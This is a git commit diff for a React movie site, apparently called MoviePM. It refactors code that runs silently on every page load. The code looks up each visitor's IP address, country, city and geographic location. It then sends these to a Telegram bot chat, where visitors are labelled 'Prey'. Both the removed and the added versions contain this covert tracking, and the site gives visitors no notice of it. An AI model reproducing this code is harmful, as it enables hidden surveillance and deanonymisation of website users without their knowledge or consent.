439d95ceb1af3d3b5097b8ae59179f564a90c658
Islom Pardaboyev <ipardaboyev574@gmail.com>
2025-01-01 11:39:37 +0500

    init

--- src/App.tsx
+++ src/App.tsx
@@ -1,27 +1,27 @@
 import axios from "axios";
 import CustomRoutes from "./routes";
+import { useEffect } from "react";
+import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv";
 
-let TOKEN = import.meta.env.VITE_APP_IP_API_KEY;
-let CHAT_ID = import.meta.env.VITE_APP_CHAT_ID;
-let TELEGRAM_TOKEN = import.meta.env.VITE_APP_TELEGRAM_TOKEN;
-let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
-
-axios(`https://apiip.net/api/check?accessKey=${TOKEN}`).then((res) => {
-  let message = `<b>Find Prey</b>\n`;
-  message += `<b>Site name:</b> MoviePM🎥\n`;
-  message += `<b>Country:</b> ${res.data.countryName}\n`;
-  message += `<b>City:</b> ${res.data.city}\n`;
-  message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
-  message += `<b>Prey's country flag:</b> ${res.data.countryFlagEmoj}`;
-
-  axios.post(`${URL}/sendPhoto`, {
-    chat_id: CHAT_ID,
-    photo: "https://ibb.co/7vVXX4G",
-    caption: message,
-    parse_mode: "HTML",
-  });
-});
 function App() {
+  useEffect(() => {
+    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    axios(IP_API).then((res) => {
+      let message = `<b>Find Prey</b>\n`;
+      message += `<b>Site name:</b> MoviePM🎥\n`;
+      message += `<b>Country:</b> ${res.data.country}\n`;
+      message += `<b>City:</b> ${res.data.city}\n`;
+      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
+      message += `<b>Location:</b> ${res.data.loc}\n`;
+      console.log(res);
+      axios.post(`${URL}/sendPhoto`, {
+        chat_id: CHAT_ID,
+        photo: "https://ibb.co/7vVXX4G",
+        caption: message,
+        parse_mode: "HTML",
+      });
+    });
+  }, []);
   return <CustomRoutes />;
 }
 
--- src/hook/useEnv.tsx
+++ src/hook/useEnv.tsx
@@ -2,3 +2,6 @@ export const API = import.meta.env.VITE_API;
 export const API_KEY = import.meta.env.VITE_API_KEY;
 export const TOKEN = import.meta.env.VITE_TOKEN;
 export const IMG_URL = import.meta.env.VITE_IMG_URL;
+export const CHAT_ID = import.meta.env.VITE_APP_CHAT_ID
+export const TELEGRAM_TOKEN = import.meta.env.VITE_APP_TELEGRAM_TOKEN
+export const IP_API = import.meta.env.VITE_APP_IP_URL
